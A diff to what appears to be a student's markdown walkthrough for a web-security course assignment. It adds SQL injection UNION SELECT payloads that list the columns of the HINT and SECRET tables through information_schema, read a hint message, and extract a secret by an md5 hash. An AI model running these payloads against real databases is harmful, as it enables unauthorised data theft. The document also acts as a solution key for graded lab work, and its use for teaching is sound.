@@ -69,8 +69,33 @@ Or use the following alternative command
 ' UNION SELECT NULL,NULL,NULL,GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='proj2_inject3'; --
 ```
 
-##### 5. NEED 2.2.1.3 HASH to Finish
+##### 5. Use the following command to get all `Column` in Table `HINT`
+```
+' UNION ALL SELECT NULL,NULL,NULL,GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='HINT'; -- 
+```
+The `column_name` got from Table `HINT` are `id` and `message`
 
+Use the following command to get `message` from Table `HINT` with `id=1`
+```
+' UNION SELECT NULL,NULL,NULL,message FROM HINT WHERE id='1'; -- 
+```
+The `message` with `id=1` is _go to table SECRET and get a secret string from row with your md5(netid)_
+
+Use the following command to get all `Column` in Table `SECRET`
+```
+' UNION ALL SELECT NULL,NULL,NULL,GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='SECRET'; -- 
+```
+The `column_name` got from Table `SECRET` are `hash`, `id`, and `secret`
+
+Use the following command to get `md5(netid)`
+```
+./md5.py
+```
+
+Then, use the following command to get `secret` from Table `SECRET` with the `hash=md5(netid)`
+```
+' UNION SELECT NULL,NULL,NULL,secret FROM SECRET WHERE hash='3168622a73961f1d17b1a105be567177'; -- 
+```
 ## Test MP2
 Check `MP2 WebSec PDF`
 
